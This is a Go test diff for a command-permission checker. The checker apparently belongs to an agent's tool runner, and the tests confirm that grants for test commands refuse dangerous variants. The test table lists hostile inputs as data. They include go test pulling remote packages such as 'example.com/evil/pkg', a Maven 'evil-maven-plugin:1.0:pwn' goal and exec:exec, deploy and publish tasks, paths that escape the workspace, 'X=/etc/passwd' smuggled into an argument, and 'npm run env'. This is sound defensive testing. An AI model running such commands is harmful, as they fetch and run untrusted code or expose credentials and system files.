@@ -185,3 +185,54 @@ func TestFamilyGrantsRefuseWhatHandsOverControl(t *testing.T) {
 		}
 	}
 }
+
+// Round 2: -mod that fetches, a go package outside the module, a further
+// Maven goal or Gradle task, a path behind = or :, and npm run env are
+// covered by no family grant; a line naming a path outside the folder or a
+// module@version is offered no scope at all.
+func TestGrantsRoundTwo(t *testing.T) {
+	for _, c := range []struct{ family, cmd string }{
+		{"go test", "go test -mod=mod example.com/evil/pkg"},
+		{"go run", "go run -mod=mod example.com/evil/cmd"},
+		{"go test", "go test -mod mod ./..."},
+		{"go test", "go test -mod=mod ./..."},
+		{"go test", "go test example.com/x"},
+		{"go build", "go build github.com/evil/tool"},
+		{"mvn test", "mvn test deploy"},
+		{"mvn test", "mvn test org.example:evil-maven-plugin:1.0:pwn"},
+		{"mvn test", "mvn test exec:exec"},
+		{"mvn test", "mvn test -pl :core"},
+		{"gradle test", "gradle test publish"},
+		{"pytest", "pytest --cov-report=html:/abs/out"},
+		{"python3 -m pytest", "python3 -m pytest --cov-report=html:../out"},
+		{"mvn test", "mvn test -Dtest=a=/x"},
+		{"npm test", "npm test -- X=/etc/passwd"},
+		{"npm run env", "npm run env"},
+	} {
+		if (bashGrant{Family: c.family}).covers(c.cmd, "/ws") || familyOf(c.cmd) != "" {
+			t.Errorf("%q covered (family %q)", c.cmd, familyOf(c.cmd))
+		}
+	}
+	for cmd, fam := range map[string]string{
+		"go test -mod=readonly ./...": "go test",
+		"go build -mod=vendor .":      "go build",
+		"go list -m all":              "go list",
+		"mvn test -pl core -am":       "mvn test",
+		"mvn test -T 4 -q":            "mvn test",
+		"gradle test -x lint":         "gradle test",
+		"gradle test --tests Foo":     "gradle test",
+		"pytest --cov-report=html":    "pytest",
+	} {
+		if got := familyOf(cmd); got != fam {
+			t.Errorf("%q: %q, want %q", cmd, got, fam)
+		}
+	}
+	for _, cmd := range []string{"go run example.com/m@latest", "go test /abs/pkg", "go test ../x", "make -C /tmp", "npm test -- X=/etc/passwd"} {
+		if opts := bashGrantOptions(cmd, "/ws", "b"); len(opts) != 0 {
+			t.Errorf("%q was offered %d scopes", cmd, len(opts))
+		}
+		if (bashGrant{Command: cmd}).covers(cmd, "/ws") {
+			t.Errorf("an exact grant covers %q", cmd)
+		}
+	}
+}
